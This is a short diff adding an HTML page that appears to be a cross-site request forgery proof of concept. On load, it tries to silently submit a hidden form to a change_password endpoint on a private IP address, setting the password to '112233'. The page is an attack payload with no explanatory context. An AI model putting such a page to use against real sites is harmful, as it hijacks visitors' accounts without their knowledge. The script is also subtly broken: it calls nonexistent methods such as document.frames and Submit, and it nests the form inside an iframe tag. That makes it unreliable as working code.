@@ -1,0 +1,19 @@
+<html>
+　　<head>
+　　　　<script type="text/javascript">
+　　　　　　function steal()
+　　　　　　{
+          　　　　iframe = document.frames["steal"];
+　　     　　      iframe.document.Submit("confirm");
+　　　　　　}
+　　　　</script>
+　　</head>
+
+　　<body onload="steal()">
+　　　　<iframe name="steal" display="none">
+　　　　　　<form method="POST" name="setting"　action="http://10.86.162.95/change_password">
+　　　　　　　　<input type="hidden" name="/change_password" value="112233">
+　　　　　　</form>
+　　　　</iframe>
+　　</body>
+</html>
